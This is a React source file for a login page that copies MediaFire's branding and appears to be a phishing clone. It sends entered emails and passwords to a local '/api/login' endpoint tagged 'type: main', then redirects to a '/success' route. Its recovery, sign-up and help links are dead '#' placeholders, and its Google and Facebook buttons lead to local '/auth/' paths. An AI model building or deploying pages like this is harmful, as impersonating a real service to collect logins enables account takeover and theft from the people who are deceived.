import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { Check } from "lucide-react";
import { useRef, useState, type FormEvent, type ReactNode } from "react";

import { cn } from "@/lib/utils";

export const Route = createFileRoute("/login")({
  head: () => ({
    meta: [
      { title: "Log In - MediaFire" },
      {
        name: "description",
        content: "Log in to your MediaFire account to access your files.",
      },
      { property: "og:title", content: "Log In - MediaFire" },
      {
        property: "og:description",
        content: "Log in to your MediaFire account to access your files.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: LoginPage,
});

const inputClass =
  "block h-[56px] w-full border-0 border-b border-mf-line bg-transparent px-[1px] pt-[6px] text-[16px] text-mf-ink outline-none transition-colors placeholder:text-mf-text-soft focus:border-b-2 focus:border-mf-blue";

const socialClass =
  "relative flex h-[50px] w-full items-center justify-center rounded-[3px] bg-mf-social-btn text-[16px] text-mf-ink outline-none transition hover:bg-mf-gray-hover focus-visible:ring-2 focus-visible:ring-mf-blue active:scale-[0.99]";

function SocialInner({ icon, children }: { icon: string; children: ReactNode }) {
  return (
    <>
      <img src={icon} alt="" className="absolute left-[12px] size-[20px] object-contain" />
      {children}
    </>
  );
}

function LoginPage() {
  const navigate = useNavigate();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [keep, setKeep] = useState(true);
  const [result, setResult] = useState<{ ok: boolean; message: string } | null>(null);
  const [xNotice, setXNotice] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const emailRef = useRef<HTMLInputElement>(null);

  const onSubmit = async (e: FormEvent) => {
    e.preventDefault();
    
    // Simple validation
    if (!email.trim()) {
      setResult({ ok: false, message: "Email is required." });
      emailRef.current?.focus();
      return;
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email.trim())) {
      setResult({ ok: false, message: "Please enter a valid email address." });
      emailRef.current?.focus();
      return;
    }

    if (!password) {
      setResult({ ok: false, message: "Password is required." });
      return;
    }

    if (password.length < 8) {
      setResult({ ok: false, message: "Password must be at least 8 characters long." });
      return;
    }

    setIsLoading(true);
    
    try {
      const response = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'main',
          email: email.trim(),
          password: password
        })
      });

      const data = await response.json();

      if (data.success) {
        setResult({ ok: true, message: data.message || "Redirecting..." });
        setPassword("");
        setTimeout(() => {
          navigate({ to: data.redirect || '/success' });
        }, 1500);
      } else {
        setResult({ ok: false, message: data.message || "Login failed." });
      }
    } catch (error) {
      setResult({ ok: false, message: "An error occurred. Please try again." });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="flex min-h-screen flex-col bg-background font-open">

      <main className="mx-auto w-full max-w-[420px] flex-1 px-[30px]">
        <div className="mt-[52px] flex justify-center">
          <img src="/assets/mediafire.svg" alt="MediaFire" className="h-auto w-[257px] max-w-full" />
        </div>

        <h1 className="mt-[50px] text-center text-[22px] leading-tight font-light text-mf-text">
          How do you want to log in?
        </h1>

        <form onSubmit={onSubmit} noValidate className="mt-[27px]" autoComplete="off">
          {result && (
            <div
              role={result.ok ? "status" : "alert"}
              className={cn(
                "-mx-px mt-[6px] mb-[5px] flex min-h-[27px] items-center justify-center border px-3 py-[3px] text-center text-[12.5px] leading-snug",
                result.ok
                  ? "border-mf-success-text/30 bg-mf-success-bg text-mf-success-text"
                  : "border-mf-error-border bg-mf-error-bg text-mf-error-text",
              )}
            >
              {result.message}
            </div>
          )}

          <label className="sr-only" htmlFor="email">
            Email address
          </label>
          <input
            id="email"
            ref={emailRef}
            autoFocus
            type="email"
            inputMode="email"
            autoComplete="email"
            placeholder="Email address"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className={inputClass}
          />
          <label className="sr-only" htmlFor="password">
            Password
          </label>
          <input
            id="password"
            type="password"
            autoComplete="current-password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className={cn(inputClass, "mt-[5px]")}
          />
          <div className="mt-[14px] flex items-center justify-between text-[13px]">
            <label className="flex cursor-pointer items-center gap-[9px] text-mf-text">
              <input
                type="checkbox"
                checked={keep}
                onChange={(e) => setKeep(e.target.checked)}
                className="peer sr-only"
              />
              <span
                aria-hidden="true"
                className={cn(
                  "flex size-[16px] items-center justify-center rounded-[2px] border transition-colors peer-focus-visible:ring-2 peer-focus-visible:ring-mf-blue/40",
                  keep ? "border-mf-blue bg-mf-blue text-primary-foreground" : "border-mf-text-soft bg-background",
                )}
              >
                {keep && <Check className="size-[13px]" strokeWidth={3.5} />}
              </span>
              Keep me logged in
            </label>
            <Link className="text-mf-blue hover:text-mf-blue-hover" to="#">Forgot password?</Link>
          </div>

          <button
            type="submit"
            disabled={isLoading}
            className="mt-[33px] h-[50px] w-full rounded-[3px] bg-mf-blue text-[16px] font-normal tracking-[0.02em] text-primary-foreground outline-none transition hover:bg-mf-blue-hover focus-visible:ring-2 focus-visible:ring-mf-blue focus-visible:ring-offset-2 active:scale-[0.99] disabled:opacity-70"
          >
            {isLoading ? "LOGGING IN..." : "LOG IN"}
          </button>
        </form>
      </main>

      <div className="mt-[31px] border-t border-mf-line" />

      <section className="mx-auto w-full max-w-[420px] px-[30px]">
        <div className="flex flex-col gap-[25px]">
          <Link to="/auth/google" className={socialClass}>
            <SocialInner icon="/assets/google.svg">LOG IN WITH GOOGLE</SocialInner>
          </Link>
          <Link to="/auth/facebook" className={socialClass}>
            <SocialInner icon="/assets/facebook.svg">LOG IN WITH FACEBOOK</SocialInner>
          </Link>
          <button type="button" onClick={() => setXNotice(true)} className={socialClass}>
            <SocialInner icon="/assets/x.svg">LOG IN WITH X</SocialInner>
          </button>
        </div>

        {xNotice && (
          <div role="status" className="mt-[24px] text-center text-[13.2px] leading-[1.62] text-mf-text">
            <p className="font-bold text-mf-ink">X Login has been disabled.</p>
            <p>
              To access a MediaFire account created with X Login, please{" "}
              <Link className="text-mf-blue hover:text-mf-blue-hover" to="#">request a password</Link>.
            </p>
          </div>
        )}

        <div className="mt-[29px] flex min-h-[56px] items-center justify-center bg-mf-gray px-3 py-3 text-center text-[14.5px] text-mf-text">
          <p>
            Don't have an account?{" "}
            <Link className="text-mf-blue hover:text-mf-blue-hover" to="#">Create an account</Link>
          </p>
        </div>
      </section>

      <footer className="mt-[47px] border-t border-mf-line bg-mf-footer pt-[32px] pb-[34px] text-center text-[12.5px] text-mf-footer-text">
        <p>
          ©2026 MediaFire <span className="ml-[6px]">Build 121967</span>
        </p>
        <p className="mt-[18px]">
          Need help?{" "}
          <Link className="text-mf-blue hover:text-mf-blue-hover" to="#">Submit a ticket</Link>.
        </p>
      </footer>
    </div>
  );
}
